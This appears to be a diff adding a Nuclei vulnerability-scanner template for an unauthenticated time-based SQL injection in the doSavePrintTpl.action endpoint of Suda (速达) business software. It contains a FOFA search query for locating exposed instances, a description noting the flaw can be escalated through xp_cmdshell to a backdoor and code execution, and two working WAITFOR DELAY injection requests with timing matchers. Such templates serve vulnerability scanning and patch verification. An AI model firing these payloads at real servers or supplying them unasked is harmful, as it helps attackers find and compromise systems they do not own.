@@ -1,0 +1,31 @@
+id: suda-doSavePrintTpl_action-sql-time
+
+info:
+  name: "速达软件 doSavePrintTpl.action 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="速达软件技术（广州）有限公司" && body="jslib/extjs2.3/view/PasswordField.js"
+      速达软件产品线中 doSavePrintTpl.action 接口存在 SQL 注入缺陷，攻击者可通过构造恶意 SQL 语句利用该漏洞，结合 xpcmdshell 扩展存储过程实现后门文件写入与任意代码执行，最终达成对目标服务器的控制。该漏洞无需身份验证即可触发，存在严重的远程代码执行风险。
+  reference:
+  - https://mp.weixin.qq.com/s/PJPzkuBRQr_NmisAvI79gQ
+  tags: 速达软件
+
+http:
+- raw:
+  - |
+    GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=-1&modId=-1&accsetName=1%27;WAITFOR+DELAY%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+
+  - |
+    GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=-1&modId=-1&accsetName=1%27;WAITFOR+DELAY%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
